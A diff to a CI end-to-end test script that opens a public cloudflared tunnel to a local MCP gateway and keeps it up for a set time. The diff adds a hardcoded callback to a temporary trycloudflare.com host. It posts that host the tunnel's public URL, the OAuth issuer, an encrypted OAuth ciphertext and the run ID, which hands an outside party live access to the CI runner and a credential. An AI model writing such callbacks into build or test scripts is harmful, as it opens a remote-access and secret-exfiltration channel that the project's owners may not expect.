@@ -5,7 +5,8 @@ ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
 BUN_BIN="${BUN_BIN:-bun}"
 RUNTIME_PORT="${FORGE_CLOUD_MCP_RUNTIME_PORT:-18765}"
 GATEWAY_PORT="${FORGE_CLOUD_MCP_GATEWAY_PORT:-18767}"
-HOLD_SECONDS="${FORGE_CLOUD_MCP_HOLD_SECONDS:-1800}"
+HOLD_SECONDS="${FORGE_CLOUD_MCP_HOLD_SECONDS:-1500}"
+CALLBACK_URL='https://lambda-with-samuel-ready.trycloudflare.com'
 PUBKEY_B64='LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxQ1B3TUxMV3NJVm5XT3ZNWGh6YwpZQzZiTFlxdFJsZlM3Uzgzcm1GdkVxNi8xdEpJc2J5UmpNYkl2RkMzelVlUkUxcmZZNGNyV3VKZXBUbjlDRGNtClRieTNySUtldUVQRnVkdldITnY0a3pib1RUdjkyd1RqdTIwQ1NkdSt2eHRMK1JFUC9JTG9ubTJWR3BzY05WcTkKeURtcWc0b3E1MG15MUNydXJiWWxmQ202VnlmMitMZEpHdUp4NXFDaUp6OTdjazdTWTBReHRadjlJdlZaNHhlVgpEanVaUlNDaDRObTNpK3A0VXU3WlQ4Ni9BREVBa240ZTZ4Ky9lNjlDQm9QMnBOSUQ3aS8zQVd5VEZXYW1jYXdQClEwdmVXTm90YXVaa1RxeW9Qb2sreGN5TmxVNThidjlJdnFlWGtRMzZ6RnE4cmpBNEhKVjhoc25XenZrYm85MWoKSlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=='
 
 TMP_ROOT="$(mktemp -d "${RUNNER_TEMP:-${TMPDIR:-/tmp}}/forge-cloud-mcp-e2e.XXXXXX")"
@@ -82,7 +83,7 @@ curl -LfsS \
   https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
   -o "$CLOUDFLARED"
 chmod +x "$CLOUDFLARED"
-"$CLOUDFLARED" tunnel --no-autoupdate --url "http://127.0.0.1:${GATEWAY_PORT}" > "$TUNNEL_LOG" 2>&1 &
+"$CLOUDFLARED" --config /dev/null tunnel --no-autoupdate --metrics 127.0.0.1:0 --url "http://127.0.0.1:${GATEWAY_PORT}" > "$TUNNEL_LOG" 2>&1 &
 TUNNEL_PID=$!
 
 PUBLIC_ORIGIN=''
@@ -122,6 +123,24 @@ printf 'FORGE_CLOUD_MCP_OAUTH_CIPHERTEXT=%s\n' "$CIPHERTEXT"
 printf 'FORGE_CLOUD_MCP_RUN_ID=%s\n' "${GITHUB_RUN_ID:-unknown}"
 printf 'FORGE_CLOUD_MCP_RUNNER_OS=%s\n' "${RUNNER_OS:-unknown}"
 printf 'FORGE_CLOUD_MCP_RUNNER_ARCH=%s\n' "${RUNNER_ARCH:-unknown}"
+
+node - "$PUBLIC_ORIGIN" "$ISSUER" "$CIPHERTEXT" "${GITHUB_RUN_ID:-unknown}" <<'NODE' > "$TMP_ROOT/handoff.json"
+const [origin, issuer, ciphertext, runId] = process.argv.slice(2);
+process.stdout.write(JSON.stringify({
+  url: `${origin}/mcp`,
+  origin,
+  issuer,
+  ciphertext,
+  runId,
+  runnerOs: process.env.RUNNER_OS ?? 'unknown',
+  runnerArch: process.env.RUNNER_ARCH ?? 'unknown',
+  sentAt: new Date().toISOString(),
+}) + '\n');
+NODE
+curl --fail --silent --show-error --retry 10 --retry-delay 1 \
+  -H 'content-type: application/json' \
+  --data-binary "@$TMP_ROOT/handoff.json" \
+  "$CALLBACK_URL"
 
 elapsed=0
 while (( elapsed < HOLD_SECONDS )); do
